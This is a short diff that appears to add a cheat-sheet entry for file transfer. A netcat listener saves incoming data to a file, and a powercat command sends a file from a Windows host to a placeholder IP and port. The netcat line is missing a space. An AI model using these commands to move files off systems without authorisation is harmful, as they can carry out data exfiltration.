@@ -1,0 +1,5 @@
+Client
+nc-lnvp {PORT} > {FILE}
+
+Server
+powercat -c {IP} -p {PORT} -i {FILE-TO-TRANSFER}
